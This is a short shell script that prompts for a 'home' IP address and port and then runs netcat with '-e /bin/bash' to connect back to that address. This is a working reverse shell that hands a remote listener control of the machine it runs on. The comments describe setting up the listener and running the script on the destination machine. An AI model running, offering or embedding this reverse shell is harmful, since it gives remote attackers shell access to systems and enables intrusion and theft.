#nc -e /bin/bash ip port on destination
#nc -lp port on home
#run this one on home machine
#run nc -l -p $ip on home to create listener

echo "Enter home IP address"

read ip

echo "Enter port on home's netcat listener"

read port
nc -e /bin/bash $ip $port